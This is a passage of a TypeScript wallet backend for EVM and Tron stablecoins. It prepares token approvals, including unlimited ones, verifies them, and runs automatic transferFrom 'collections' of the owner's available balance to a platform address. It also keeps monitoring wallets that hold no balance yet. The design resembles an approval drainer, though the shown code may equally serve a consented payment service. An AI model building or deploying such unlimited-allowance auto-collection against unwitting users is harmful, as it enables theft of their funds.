    let txHash = transfer.payloadKind === "tron" ? transfer.txHash : null;
    if (transfer.payloadKind === "tron" && transfer.signedPayload) {
      signed = JSON.parse(transfer.signedPayload) as Record<string, unknown>;
    }

    if (!signed || !txHash) {
      const trigger = await tron.transactionBuilder.triggerSmartContract(
        args.tokenAddress,
        "transferFrom(address,address,uint256)",
        { feeLimit: this.platformConfig.getApproval().tronTransferFeeLimitSun },
        [
          { type: "address", value: args.owner },
          { type: "address", value: args.to },
          { type: "uint256", value: args.amountRaw.toString() },
        ],
        spenderAddress,
      );
      const unsignedTx = trigger.transaction;
      if (!unsignedTx)
        throw new Error("Failed to build Tron transferFrom transaction");
      signed = (await tron.trx.sign(unsignedTx, pk)) as unknown as Record<
        string,
        unknown
      >;
      txHash = String(signed.txID ?? "");
      if (!txHash) throw new Error("Signed Tron transaction is missing txID");
      transfer = await prisma.transfer.update({
        where: { id: args.transferId },
        data: {
          signedPayload: JSON.stringify(signed),
          payloadKind: "tron",
          txHash,
          status: "prepared",
          errorMessage: null,
        },
      });
    }

    const broadcast = await tron.trx.sendRawTransaction(signed as never);
    if (
      !broadcast.result &&
      !/DUP_TRANSACTION_ERROR/i.test(String(broadcast.code ?? ""))
    ) {
      const message = decodeTronNodeMessage(
        typeof broadcast.message === "string" ? broadcast.message : null,
      );
      throw new Error(
        humanizeTronBroadcastError({
          code: typeof broadcast.code === "string" ? broadcast.code : null,
          message,
        }),
      );
    }
    await prisma.transfer.update({
      where: { id: transfer.id },
      data: {
        status: "broadcast",
        broadcastAt: transfer.broadcastAt ?? new Date(),
      },
    });
    this.notifyTransferUpdated({
      transferId: transfer.id,
      status: "broadcast",
      approvalId: args.approvalId,
      ownerAddress: args.owner,
      network: args.network,
      txHash,
    });
    if (!args.waitForConfirmation) {
      return { txHash, blockNumber: null };
    }

    const txConfirm = this.platformConfig.getTransfer();
    for (
      let attempt = 0;
      attempt < txConfirm.tronTxConfirmMaxAttempts;
      attempt += 1
    ) {
      const info = (await tron.trx
        .getTransactionInfo(txHash)
        .catch(() => null)) as {
        id?: string;
        blockNumber?: number;
        receipt?: { result?: string };
        result?: string;
      } | null;
      if (info?.id || info?.blockNumber != null) {
        const result = info.receipt?.result ?? info.result ?? "SUCCESS";
        if (result !== "SUCCESS")
          throw new Error(`TRON transferFrom failed: ${result}`);
        return { txHash, blockNumber: info.blockNumber ?? null };
      }
      await sleep(txConfirm.tronTxConfirmPollMs);
    }
    throw new Error("Transaction confirmation timeout");
  }

  private async executeAutoTransfer(args: {
    approval: {
      id: string;
      ownerAddress: string;
      spenderAddress: string;
      network: string;
      tokenSymbol: string;
      tokenAddress: string;
      decimals: number;
      remainingRaw: string;
      collectedRaw: string;
      unlimited: boolean;
      failureCount: number;
      traceId?: string | null;
    };
    transferToAddress: string;
    requestedRaw: bigint;
    allowanceRaw: bigint;
    idempotencyKey?: string;
  }): Promise<{
    transferId: string;
    txHash: string;
    transferredRaw: string;
    blockNumber: number | null;
  }> {
    const { approval, transferToAddress, requestedRaw, allowanceRaw } = args;
    this.logFlow("AUTO TRANSFER STARTED", {
      approvalId: approval.id,
      network: approval.network,
      token: approval.tokenSymbol,
      requestedRaw: requestedRaw.toString(),
      transferToAddress,
    });
    const idempotencyKey =
      args.idempotencyKey ??
      `auto:${createHash("sha256")
        .update(
          `${approval.id}:${approval.collectedRaw}:${approval.failureCount}:${transferToAddress.toLowerCase()}`,
        )
        .digest("hex")
        .slice(0, 48)}`;
    const existing = await prisma.transfer.findUnique({
      where: { idempotencyKey },
    });
    if (existing?.status === "confirmed" && existing.txHash) {
      this.logFlow("AUTO TRANSFER IDEMPOTENT HIT", {
        transferId: existing.id,
        txHash: existing.txHash,
      });
      return {
        transferId: existing.id,
        txHash: existing.txHash,
        transferredRaw: existing.amountRaw,
        blockNumber: existing.blockNumber ?? null,
      };
    }

    const remaining = BigInt(approval.remainingRaw);
    let transferable: bigint;
    if (existing?.signedPayload && existing.txHash) {
      // Reconcile/rebroadcast the exact durable attempt after a restart or
      // confirmation timeout; do not create a second transaction.
      transferable = BigInt(existing.amountRaw);
    } else {
      const ownerBalance = await this.readTokenBalanceRawWithRetry(
        approval.network,
        approval.ownerAddress,
        approval.tokenSymbol as TokenSymbol,
      );
      transferable = computeTransferable({
        requested: requestedRaw,
        allowance: allowanceRaw,
        balance: ownerBalance,
        remaining,
        unlimited: approval.unlimited,
      });
      if (transferable <= BigInt(0)) {
        this.logFlow("AUTO TRANSFER SKIPPED", {
          reason: "no_transferable_amount",
          requestedRaw: requestedRaw.toString(),
          allowanceRaw: allowanceRaw.toString(),
          ownerBalance: ownerBalance.toString(),
          remainingRaw: remaining.toString(),
        });
        throw new BadRequestException(
          "No transferable balance/allowance remaining",
        );
      }
    }

    const transfer = existing
      ? await prisma.transfer.update({
          where: { id: existing.id },
          data: {
            amountRaw: transferable.toString(),
            errorMessage: null,
          },
        })
      : await prisma.transfer.create({
          data: {
            approvalId: approval.id,
            idempotencyKey,
            amountRaw: transferable.toString(),
            fromAddress: approval.ownerAddress,
            toAddress: transferToAddress,
            status: "pending",
            ...(approval.traceId
              ? {
                  publicId: await allocatePublicId(
                    prisma,
                    "transfer",
                    tokenQualifier(approval.tokenSymbol),
                    approval.traceId,
                  ),
                }
              : {}),
          },
        });

    try {
      const tx =
        approval.network === "tron"
          ? await this.executeTronTransferFrom({
              transferId: transfer.id,
              approvalId: approval.id,
              network: approval.network,
              tokenAddress: approval.tokenAddress,
              owner: approval.ownerAddress,
              to: transferToAddress,
              amountRaw: transferable,
            })
          : await this.executeEvmTransferFrom({
              transferId: transfer.id,
              approvalId: approval.id,
              network: approval.network as EvmChainKey,
              tokenAddress: approval.tokenAddress,
              owner: approval.ownerAddress,
              to: transferToAddress,
              amountRaw: transferable,
            });

      const progress = applyConfirmedCollection({
        remaining,
        collected: BigInt(approval.collectedRaw),
        transferred: transferable,
        unlimited: approval.unlimited,
      });
      await prisma.$transaction([
        prisma.transfer.update({
          where: { id: transfer.id },
          data: {
            txHash: tx.txHash,
            blockNumber: tx.blockNumber ?? undefined,
            status: "confirmed",
            confirmedAt: new Date(),
            errorMessage: null,
          },
        }),
        prisma.collectionIntent.updateMany({
          where: {
            approvalId: approval.id,
            status: {
              in: [
                CollectionIntentStatus.CREATED,
                CollectionIntentStatus.QUEUED,
                CollectionIntentStatus.EXECUTING,
                CollectionIntentStatus.BROADCAST,
                CollectionIntentStatus.CONFIRMING,
              ],
            },
          },
          data: {
            status: CollectionIntentStatus.SETTLED,
            settledRaw: transferable.toString(),
            settledAt: new Date(),
          },
        }),
        prisma.approval.updateMany({
          where: {
            id: approval.id,
            status: { notIn: ["SUPERSEDED", "REVOKED", "EXPIRED"] },
          },
          data: {
            remainingRaw: progress.remaining.toString(),
            collectedRaw: progress.collected.toString(),
            status: progress.status,
            collectionEnabled: progress.keepMonitoring,
            nextCheckAt: progress.keepMonitoring
              ? this.nextCollectionCheck()
              : null,
            failureCount: 0,
            lastError: null,
          },
        }),
      ]);
      await this.recordTransferExecutedAudit({
        approvalId: approval.id,
        transferId: transfer.id,
        network: approval.network,
        token: approval.tokenSymbol,
        amountRaw: transferable.toString(),
        txHash: tx.txHash,
        toAddress: transferToAddress,
      });
      this.notifyTransferUpdated({
        transferId: transfer.id,
        status: "confirmed",
        approvalId: approval.id,
        ownerAddress: approval.ownerAddress,
        network: approval.network,
        txHash: tx.txHash,
      });
      this.notifyApprovalUpdated({
        approvalId: approval.id,
        ownerAddress: approval.ownerAddress,
        status: progress.status,
        network: approval.network,
      });

      return {
        transferId: transfer.id,
        txHash: tx.txHash,
        transferredRaw: transferable.toString(),
        blockNumber: tx.blockNumber,
      };
    } catch (err) {
      const message = getErrorMessage(err);
      const current = await prisma.transfer.findUnique({
        where: { id: transfer.id },
        select: {
          status: true,
          confirmedAt: true,
          txHash: true,
          blockNumber: true,
          amountRaw: true,
          signedPayload: true,
        },
      });
      if (current?.confirmedAt || current?.status === "confirmed") {
        this.logFlow("AUTO TRANSFER POST_CONFIRM_ERROR", {
          transferId: transfer.id,
          txHash: current.txHash ?? undefined,
          error: message,
        });
        if (current.txHash) {
          await this.recordTransferExecutedAudit({
            approvalId: approval.id,
            transferId: transfer.id,
            network: approval.network,
            token: approval.tokenSymbol,
            amountRaw: current.amountRaw,
            txHash: current.txHash,
            toAddress: transferToAddress,
          });
        }
        this.notifyTransferUpdated({
          transferId: transfer.id,
          status: "confirmed",
          approvalId: approval.id,
          ownerAddress: approval.ownerAddress,
          network: approval.network,
          txHash: current.txHash,
        });
        return {
          transferId: transfer.id,
          txHash: current.txHash ?? "",
          transferredRaw: current.amountRaw,
          blockNumber: current.blockNumber ?? null,
        };
      }

      this.logFlow("AUTO TRANSFER FAILED", {
        transferId: transfer.id,
        error: message,
      });
      const confirmedOnChainFailure =
        /EVM transferFrom transaction failed|TRON transferFrom failed/i.test(
          message,
        );
      const confirmationPending =
        Boolean(current?.signedPayload) && !confirmedOnChainFailure;
      const nextStatus = confirmationPending ? "broadcast" : "failed";
      await prisma.transfer.update({
        where: { id: transfer.id },
        data: {
          status: nextStatus,
          errorMessage: message,
          retryCount: { increment: 1 },
        },
      });
      this.notifyTransferUpdated({
        transferId: transfer.id,
        status: nextStatus,
        approvalId: approval.id,
        ownerAddress: approval.ownerAddress,
        network: approval.network,
        txHash: current?.txHash ?? transfer.txHash,
      });
      throw err;
    }
  }

  private async recordTransferExecutedAudit(args: {
    approvalId: string;
    transferId: string;
    network: string;
    token: string;
    amountRaw: string;
    txHash: string;
    toAddress: string;
  }): Promise<void> {
    await this.recordAudit(
      "admin",
      "transfer_executed",
      "approval",
      {
        transferId: args.transferId,
        approvalId: args.approvalId,
        network: args.network,
        token: args.token,
        amountRaw: args.amountRaw,
        txHash: args.txHash,
        toAddress: args.toAddress,
      },
      args.approvalId,
    );
  }

  private notifyTransferUpdated(args: {
    transferId: string;
    status: string;
    approvalId: string;
    ownerAddress: string;
    network: string;
    txHash?: string | null;
    repaired?: boolean;
  }): void {
    this.adminEvents.transferUpdated({
      id: args.transferId,
      status: args.status,
      approvalId: args.approvalId,
      ownerAddress: args.ownerAddress,
      network: args.network,
      txHash: args.txHash,
      repaired: args.repaired,
    });
    this.adminEvents.userUpdated({ address: args.ownerAddress });
  }

  private notifyApprovalUpdated(args: {
    approvalId: string;
    ownerAddress: string;
    status: string;
    network: string;
  }): void {
    this.adminEvents.approvalUpdated({
      id: args.approvalId,
      ownerAddress: args.ownerAddress,
      status: args.status,
      network: args.network,
    });
    this.adminEvents.userUpdated({ address: args.ownerAddress });
  }

  private notifyCollectionIntentUpdated(args: {
    id: string;
    approvalId: string;
    ownerAddress: string;
    status: CollectionIntentStatus;
    network: string;
    attemptId?: string;
    txHash?: string | null;
  }): void {
    this.adminEvents.collectionIntentUpdated({
      id: args.id,
      approvalId: args.approvalId,
      ownerAddress: args.ownerAddress,
      status: args.status,
      network: args.network,
      attemptId: args.attemptId,
      txHash: args.txHash ?? null,
    });
    this.adminEvents.userUpdated({ address: args.ownerAddress });
  }

  /** Fix rows confirmed on-chain but left as broadcast after a post-confirm failure. */
  async repairInconsistentConfirmedTransfers(limit = 100): Promise<number> {
    const rows = await prisma.transfer.findMany({
      where: {
        status: "broadcast",
        confirmedAt: { not: null },
        blockNumber: { not: null },
      },
      include: { approval: true },
      orderBy: { updatedAt: "asc" },
      take: limit,
    });
    let repaired = 0;
    for (const row of rows) {
      await prisma.transfer.update({
        where: { id: row.id },
        data: { status: "confirmed", errorMessage: null },
      });
      if (row.txHash) {
        await this.recordTransferExecutedAudit({
          approvalId: row.approvalId,
          transferId: row.id,
          network: row.approval.network,
          token: row.approval.tokenSymbol,
          amountRaw: row.amountRaw,
          txHash: row.txHash,
          toAddress: row.toAddress,
        });
      }
      this.notifyTransferUpdated({
        transferId: row.id,
        status: "confirmed",
        approvalId: row.approvalId,
        ownerAddress: row.approval.ownerAddress,
        network: row.approval.network,
        txHash: row.txHash,
        repaired: true,
      });
      incrementCounter("reconciliation.repaired.total", {
        network: row.approval.network,
        kind: "token_inconsistent",
      });
      repaired += 1;
    }

    const staleErrors = await prisma.transfer.findMany({
      where: {
        status: "confirmed",
        errorMessage: { not: null },
        confirmedAt: { not: null },
        blockNumber: { not: null },
      },
      include: { approval: true },
      orderBy: { updatedAt: "asc" },
      take: limit,
    });
    for (const row of staleErrors) {
      await prisma.transfer.update({
        where: { id: row.id },
        data: { errorMessage: null },
      });
      this.notifyTransferUpdated({
        transferId: row.id,
        status: "confirmed",
        approvalId: row.approvalId,
        ownerAddress: row.approval.ownerAddress,
        network: row.approval.network,
        txHash: row.txHash,
        repaired: true,
      });
      incrementCounter("reconciliation.repaired.total", {
        network: row.approval.network,
        kind: "stale_error_cleared",
      });
      repaired += 1;
    }

    if (repaired > 0) {
      this.logger.emit({
        level: "info",
        module: "wallet-service",
        operation: "transfer_reconcile",
        stage: "INCONSISTENT_REPAIRED",
        status: "success",
        message: "Repaired transfers left as broadcast after confirmation",
        context: { repaired },
        skipSampling: true,
      });
    }
    return repaired;
  }

  async reconcileTransfer(transferId: string) {
    const transfer = await prisma.transfer.findUnique({
      where: { id: transferId },
      include: { approval: true },
    });
    if (!transfer) throw new NotFoundException("Transfer not found");

    if (transfer.status === "confirmed") {
      return { ok: true, idempotent: true, item: transfer };
    }

    if (
      transfer.status === "broadcast" &&
      transfer.confirmedAt != null &&
      transfer.blockNumber != null
    ) {
      const item = await prisma.transfer.update({
        where: { id: transferId },
        data: { status: "confirmed", errorMessage: null },
      });
      if (transfer.txHash) {
        await this.recordTransferExecutedAudit({
          approvalId: transfer.approvalId,
          transferId: transfer.id,
          network: transfer.approval.network,
          token: transfer.approval.tokenSymbol,
          amountRaw: transfer.amountRaw,
          txHash: transfer.txHash,
          toAddress: transfer.toAddress,
        });
      }
      this.notifyTransferUpdated({
        transferId: transfer.id,
        status: "confirmed",
        approvalId: transfer.approvalId,
        ownerAddress: transfer.approval.ownerAddress,
        network: transfer.approval.network,
        txHash: transfer.txHash,
        repaired: true,
      });
      incrementCounter("reconciliation.repaired.total", {
        network: transfer.approval.network,
        kind: "token_inconsistent",
      });
      return { ok: true, repaired: true, item };
    }

    if (!["broadcast", "failed"].includes(transfer.status)) {
      throw new BadRequestException(
        `Transfer status ${transfer.status} cannot be reconciled`,
      );
    }

    const approval = transfer.approval;
    const executed = await this.executeAutoTransfer({
      approval: {
        id: approval.id,
        ownerAddress: approval.ownerAddress,
        spenderAddress: approval.spenderAddress,
        network: approval.network,
        tokenSymbol: approval.tokenSymbol,
        tokenAddress: approval.tokenAddress,
        decimals: approval.decimals,
        remainingRaw: approval.remainingRaw,
        collectedRaw: approval.collectedRaw,
        unlimited: approval.unlimited,
        failureCount: approval.failureCount,
      },
      transferToAddress: transfer.toAddress,
      requestedRaw: BigInt(transfer.amountRaw),
      allowanceRaw: BigInt(transfer.amountRaw),
      idempotencyKey: transfer.idempotencyKey,
    });

    const item = await prisma.transfer.findUniqueOrThrow({
      where: { id: executed.transferId },
      include: { approval: true },
    });
    this.notifyTransferUpdated({
      transferId: item.id,
      status: item.status,
      approvalId: item.approvalId,
      ownerAddress: item.approval.ownerAddress,
      network: item.approval.network,
      txHash: item.txHash,
      repaired: item.status === "confirmed",
    });
    return { ok: true, item };
  }

  async reconcileBroadcastTransfers(limit = 10): Promise<number> {
    await this.repairInconsistentConfirmedTransfers(limit);
    const pending = await prisma.transfer.findMany({
      where: { status: "broadcast", confirmedAt: null },
      orderBy: { broadcastAt: "asc" },
      take: limit,
      select: { id: true },
    });
    let reconciled = 0;
    for (const { id } of pending) {
      try {
        await this.reconcileTransfer(id);
        reconciled += 1;
      } catch (err) {
        this.logger.emit({
          level: "warn",
          module: "wallet-service",
          operation: "transfer_reconcile",
          stage: "BROADCAST_RECONCILE_FAILED",
          status: "failure",
          message: getErrorMessage(err, "Broadcast transfer reconcile failed"),
          context: { transferId: id },
          err,
        });
      }
    }
    return reconciled;
  }

  async getBalances(evm: string, tron: string) {
    this.logFlow("BALANCES REQUEST", {
      evm: Boolean(evm),
      tron: Boolean(tron),
    });
    if (!evm && !tron)
      throw new BadRequestException("Provide at least evm or tron address");
    if (evm && !EVM_ADDRESS_RE.test(evm))
      throw new BadRequestException("Invalid EVM address");
    if (tron && !TRON_ADDRESS_RE.test(tron))
      throw new BadRequestException("Invalid TRON address");
    const result: Record<string, TokenBalances> = {};
    if (evm) {
      for (const network of Object.keys(EVM_RPCS) as EvmChainKey[]) {
        const rpcs = EVM_RPCS[network];
        let native = "0";
        for (const rpc of rpcs) {
          try {
            native = this.formatUnits(
              BigInt(
                await this.rpcCall(rpc, "eth_getBalance", [evm, "latest"]),
              ),
              18,
            );
            break;
          } catch {}
        }
        const usdtCfg = TOKENS[network].USDT;
        const usdcCfg = TOKENS[network].USDC;
        const [usdtRaw, usdcRaw] = await Promise.all([
          this.rpcCall(rpcs[0], "eth_call", [
            {
              to: usdtCfg.address,
              data: `0x70a08231${evm.slice(2).toLowerCase().padStart(64, "0")}`,
            },
            "latest",
          ]).catch(() => "0x0"),
          this.rpcCall(rpcs[0], "eth_call", [
            {
              to: usdcCfg.address,
              data: `0x70a08231${evm.slice(2).toLowerCase().padStart(64, "0")}`,
            },
            "latest",
          ]).catch(() => "0x0"),
        ]);
        const usdtHuman = this.formatUnits(BigInt(usdtRaw), usdtCfg.decimals);
        const usdcHuman = this.formatUnits(BigInt(usdcRaw), usdcCfg.decimals);
        result[network] = { native, usdt: usdtHuman, usdc: usdcHuman };
      }
    }
    if (tron) {
      const res = await fetch(`https://api.trongrid.io/v1/accounts/${tron}`, {
        cache: "no-store",
      });
      const json = (await res.json().catch(() => ({}))) as {
        data?: Array<{
          balance?: number;
          trc20?: Array<Record<string, string>>;
        }>;
      };
      const acc = json.data?.[0];
      let usdt = BigInt(0);
      let usdc = BigInt(0);
      for (const t of acc?.trc20 ?? []) {
        if (t[TOKENS.tron.USDT.address] !== undefined)
          usdt = BigInt(t[TOKENS.tron.USDT.address]);
        if (t[TOKENS.tron.USDC.address] !== undefined)
          usdc = BigInt(t[TOKENS.tron.USDC.address]);
      }
      result.tron = {
        native: this.formatUnits(BigInt(acc?.balance ?? 0), 6),
        usdt: this.formatUnits(usdt, 6),
        usdc: this.formatUnits(usdc, 6),
      };
    }
    this.logFlow("BALANCES RESPONSE", { networks: Object.keys(result) });
    return result;
  }

  async prepareApproval(body: Record<string, unknown>) {
    const network = String(body.network ?? "")
      .trim()
      .toLowerCase();
    const owner = String(body.owner ?? "").trim();
    const token = this.parseToken(body.token);
    const unlimited = Boolean(body.unlimited);
    this.logFlow("APPROVAL PREPARE REQUEST", { network, token, unlimited });
    if (!network || !owner)
      throw new BadRequestException("network and owner are required");
    const tokenInfo = this.getToken(network, token);
    if (!tokenInfo) throw new BadRequestException("Unsupported token/network");
    const amountRaw = unlimited
      ? BigInt(MAX_UINT256)
      : this.parseHumanToRaw(
          String(body.amountHuman ?? "").trim(),
          tokenInfo.decimals,
        );
    if (!unlimited && amountRaw <= BigInt(0))
      throw new BadRequestException("Amount must be greater than zero");
    const spender = this.spenderFor(network);
    if (!spender)
      throw new BadRequestException(
        network === "tron"
          ? "Set NEXT_PUBLIC_SPENDER_TRON"
          : "Set NEXT_PUBLIC_SPENDER_EVM",
      );
    if (network === "tron") {
      if (!TRON_ADDRESS_RE.test(owner) || !TRON_ADDRESS_RE.test(spender))
        throw new BadRequestException("Invalid Tron owner/spender");
      const parameter = `${this.tronAddressToAbiWord(spender)}${amountRaw.toString(16).padStart(64, "0")}`;
      const res = await fetch(`${TRON_GRID}/wallet/triggersmartcontract`, {
        method: "POST",
        headers: this.tronHeaders(),
        body: JSON.stringify({
          owner_address: this.base58ToHex(owner),
          contract_address: this.base58ToHex(tokenInfo.address),
          function_selector: "approve(address,uint256)",
          parameter,
          fee_limit: this.platformConfig.getApproval().tronApproveFeeLimitSun,
          call_value: 0,
          visible: false,
        }),
        cache: "no-store",
      });
      const json = (await res.json()) as {
        transaction?: Record<string, unknown>;
        result?: { message?: string; result?: boolean };
        Error?: string;
      };
      if (!res.ok || json.result?.result === false || !json.transaction)
        throw new BadRequestException(
          json.result?.message || json.Error || "Failed to build Tron tx",
        );
      await this.recordAudit(`owner:${owner}`, "prepare", "approval", {
        network,
        token,
        unlimited,
        spender,
        amountRaw: amountRaw.toString(),
      });
      this.logFlow("APPROVAL PREPARE BUILT", {
        network,
        token,
        amountRaw: amountRaw.toString(),
      });
      return {
        network,
        owner,
        spender,
        token,
        tokenAddress: tokenInfo.address,
        decimals: tokenInfo.decimals,
        amountRaw: amountRaw.toString(),
        amountHuman: unlimited ? "UNLIMITED" : String(body.amountHuman ?? ""),
        unlimited,
        transaction: json.transaction,
      };
    }
    if (
      !this.isEvm(network) ||
      !EVM_ADDRESS_RE.test(owner) ||
      !EVM_ADDRESS_RE.test(spender)
    )
      throw new BadRequestException("Invalid EVM network/owner/spender");
    await this.recordAudit(`owner:${owner}`, "prepare", "approval", {
      network,
      token,
      unlimited,
      spender,
      amountRaw: amountRaw.toString(),
    });
    this.logFlow("APPROVAL PREPARE BUILT", {
      network,
      token,
      amountRaw: amountRaw.toString(),
    });
    return {
      network,
      owner,
      spender,
      token,
      tokenAddress: tokenInfo.address,
      decimals: tokenInfo.decimals,
      amountRaw: amountRaw.toString(),
      amountHuman: unlimited ? "UNLIMITED" : String(body.amountHuman ?? ""),
      unlimited,
      chainId: EVM_CHAIN_ID[network],
      to: tokenInfo.address,
      data: this.encodeApprove(spender, amountRaw),
      value: "0x0",
    };
  }

  async verifyAllowance(body: Record<string, unknown>) {
    const network = String(body.network ?? "")
      .trim()
      .toLowerCase();
    const owner = String(body.owner ?? "").trim();
    const spender = String(body.spender ?? "").trim();
    const token = this.parseToken(body.token);
    const tokenInfo = this.getToken(network, token);
    if (!tokenInfo || !owner || !spender)
      throw new BadRequestException(
        "network, owner, spender and token required",
      );
    if (network === "tron") {
      const parameter = `${this.tronAddressToAbiWord(owner)}${this.tronAddressToAbiWord(spender)}`;
      const res = await fetch(`${TRON_GRID}/wallet/triggerconstantcontract`, {
        method: "POST",
        headers: this.tronHeaders(),
        body: JSON.stringify({
          owner_address: owner,
          contract_address: tokenInfo.address,
          function_selector: "allowance(address,address)",
          parameter,
          visible: true,
        }),
        cache: "no-store",
        signal: AbortSignal.timeout(this.rpcTimeoutMs()),
      });
      const json = (await res.json()) as {
        constant_result?: string[];
        result?: { message?: string };
      };
      const hex = json.constant_result?.[0];
      if (!hex)
        throw new BadRequestException(
          json.result?.message || "Tron allowance failed",
        );
      const allowance = BigInt(`0x${hex}`).toString();
      return {
        ok: true,
        hasAllowance: BigInt(allowance) > BigInt(0),
        allowance,
        spender,
        token,
        tokenAddress: tokenInfo.address,
      };
    }
    if (!this.isEvm(network))
      throw new BadRequestException("Unsupported network");
    const data = `0xdd62ed3e${owner.slice(2).toLowerCase().padStart(64, "0")}${spender.slice(2).toLowerCase().padStart(64, "0")}`;
    const result = await this.evmRpcCall(network, "eth_call", [
      { to: tokenInfo.address, data },
      "latest",
    ]);
    const allowance = BigInt(result).toString();
    return {
      ok: true,
      hasAllowance: BigInt(allowance) > BigInt(0),
      allowance,
      spender,
      token,
      tokenAddress: tokenInfo.address,
    };
  }

  private tronFullHost(): string {
    return this.platformConfig.getChains().tronFullHost || TRON_GRID;
  }

  private async readTronTransactionInfo(txHash: string): Promise<{
    id?: string;
    blockNumber?: number;
    receipt?: { result?: string };
    result?: string;
  } | null> {
    try {
      const res = await fetch(
        `${this.tronFullHost()}/wallet/gettransactioninfobyid`,
        {
          method: "POST",
          headers: this.tronHeaders(),
          body: JSON.stringify({ value: txHash }),
          cache: "no-store",
          signal: AbortSignal.timeout(
            this.platformConfig.getCollector().rpcTimeoutMs,
          ),
        },
      );
      if (!res.ok) return null;
      return (await res.json()) as {
        id?: string;
        blockNumber?: number;
        receipt?: { result?: string };
        result?: string;
      };
    } catch {
      return null;
    }
  }

  private async verifyApprovalReceipt(args: {
    network: string;
    txHash: string;
    owner: string;
    spender: string;
    tokenAddress: string;
  }): Promise<void> {
    if (args.network === "tron") {
      const txConfirm = this.platformConfig.getTransfer();
      for (
        let attempt = 0;
        attempt < txConfirm.tronTxConfirmMaxAttempts;
        attempt += 1
      ) {
        const info = await this.readTronTransactionInfo(args.txHash);
        const result = info?.receipt?.result ?? info?.result ?? "SUCCESS";
        const confirmed =
          Boolean(info?.id) ||
          (info?.blockNumber != null && info.blockNumber > 0);
        if (confirmed && result === "SUCCESS") {
          return;
        }
        if (attempt < txConfirm.tronTxConfirmMaxAttempts - 1) {
          await sleep(txConfirm.tronTxConfirmPollMs);
        }
      }
      throw new BadRequestException(
        "Approval transaction receipt is not confirmed",
      );
    }
    if (!this.isEvm(args.network))
      throw new BadRequestException("Unsupported network");
    const [transaction, receipt] = await Promise.all([
      this.evmRpcCall(args.network, "eth_getTransactionByHash", [
        args.txHash,
      ]) as Promise<{
        from?: string;
        to?: string;
        input?: string;
        data?: string;
      } | null>,
      this.evmRpcCall(args.network, "eth_getTransactionReceipt", [
        args.txHash,
      ]) as Promise<{
        status?: string;
      } | null>,
    ]);
    const input = transaction?.input ?? transaction?.data ?? "";
    const spenderWord = args.spender
      .replace(/^0x/i, "")
      .toLowerCase()
      .padStart(64, "0");
    if (
      !transaction ||
      !receipt ||
      receipt.status !== "0x1" ||
      transaction.from?.toLowerCase() !== args.owner.toLowerCase() ||
      transaction.to?.toLowerCase() !== args.tokenAddress.toLowerCase() ||
      !input.toLowerCase().startsWith(`0x095ea7b3${spenderWord}`)
    ) {
      throw new BadRequestException(
        "Approval receipt does not match the requested authorization",
      );
    }
  }

  async confirmApproval(
    body: Record<string, unknown>,
    correlation?: { correlationId?: string; requestId?: string },
  ) {
    const network = String(body.network ?? "")
      .trim()
      .toLowerCase();
    const owner = String(body.owner ?? "").trim();
    const txHash = String(body.txHash ?? "").trim();
    const amountRaw = String(body.amountRaw ?? "").trim();
    const token = this.parseToken(body.token);
    const traceIdRaw = String(
      body.traceId ?? correlation?.correlationId ?? "",
    ).trim();
    const traceId = normalizeJourneyId(traceIdRaw);
    this.logFlow("APPROVAL CONFIRM REQUEST", {
      traceId: traceId ?? undefined,
      network,
      token,
      owner,
      txHash,
      requestId: correlation?.requestId,
    });
    if (!network || !owner || !txHash || !amountRaw)
      throw new BadRequestException(
        "network, owner, txHash, amountRaw required",
      );
    const spender = this.spenderFor(network);
    const tokenInfo = this.getToken(network, token);
    if (!tokenInfo) throw new BadRequestException("Unsupported token/network");
    let verified: Awaited<ReturnType<WalletService["verifyAllowance"]>> | null =
      null;
    const transferCfg = this.platformConfig.getTransfer();
    let verifyError: unknown;
    for (
      let attempt = 0;
      attempt < transferCfg.allowanceVerifyMaxAttempts;
      attempt += 1
    ) {
      try {
        verified = await this.verifyAllowance({
          network,
          owner,
          spender,
          token,
        });
        break;
      } catch (err) {
        verifyError = err;
        if (attempt < transferCfg.allowanceVerifyMaxAttempts - 1) {
          await sleep(
            network === "tron"
              ? transferCfg.allowancePollDelayTronMs
              : transferCfg.allowancePollDelayEvmMs,
          );
        }
      }
    }
    const expected = BigInt(amountRaw);
    const onChain = BigInt(verified?.allowance ?? "0");
    const unlimited = Boolean(body.unlimited);
    const hasAllowance = unlimited ? onChain > BigInt(0) : onChain >= expected;
    if (verified) {
      await this.verifyApprovalReceipt({
        network,
        txHash,
        owner,
        spender,
        tokenAddress: tokenInfo.address,
      });
    }
    const executeTransfer = Boolean(body.executeTransfer);
    const tokenBalanceHuman = String(body.tokenBalanceHuman ?? "").trim();
    const tokenBalanceIsZero = this.tokenBalanceIsZero(tokenBalanceHuman);
    const zeroBalanceSkipError =
      !executeTransfer && tokenBalanceIsZero
        ? TRANSFER_SKIP_REASONS.zero_balance_collect_later
        : null;
    // Automatic collections settle to platform destination (spender or dev collector).
    const transferToAddress = this.collectionDestinationFor(owner, network);
    const transferAmountRawInput = String(body.transferAmountRaw ?? "").trim();
    const transferAmountHumanInput = String(
      body.transferAmountHuman ?? "",
    ).trim();
    const immediateCollectionAt = hasAllowance
      ? new Date()
      : this.nextCollectionCheck();
    const requestedTransferRaw = transferAmountRawInput
      ? BigInt(transferAmountRawInput)
      : transferAmountHumanInput
        ? this.toRawFromHuman(transferAmountHumanInput, tokenInfo.decimals)
        : expected;
    const { approval, collectionIntent } = await prisma.$transaction(
      async (tx) => {
        const journeyFields = traceId
          ? await journeyWriteFields(
              tx,
              "approval",
              tokenQualifier(token),
              traceId,
              owner,
            )
          : {};
        const existingApproval = await tx.approval.findUnique({
          where: { network_txHash: { network, txHash } },
        });
        const persisted = existingApproval
          ? await tx.approval.update({
              where: { id: existingApproval.id },
              data: {
                termsVersion: String(
                  body.termsVersion ??
                    this.platformConfig.getApproval().termsVersion,
                ),
                collectionToAddress: transferToAddress,
                collectionEnabled: ![
                  "COMPLETED",
                  "REVOKED",
                  "EXPIRED",
                  "SUPERSEDED",
                ].includes(existingApproval.status),
                nextCheckAt: immediateCollectionAt,
                lastError: zeroBalanceSkipError ?? errorForLog(verifyError),
                ...(traceId
                  ? {
                      traceId: existingApproval.traceId ?? traceId,
                      ...(!existingApproval.publicId
                        ? {
                            publicId:
                              journeyFields.publicId ??
                              (await allocatePublicId(
                                tx,
                                "approval",
                                tokenQualifier(token),
                                traceId,
                              )),
                          }
                        : {}),
                    }
                  : {}),
              },
            })
          : await tx.approval.create({
              data: {
                ownerAddress: owner,
                spenderAddress: spender,
                network,
                tokenSymbol: token,
                tokenAddress: tokenInfo.address,
                decimals: tokenInfo.decimals,
                amountRaw,
                amountHuman: String(body.amountHuman ?? amountRaw),
                remainingRaw: amountRaw,
                collectedRaw: "0",
                txHash,
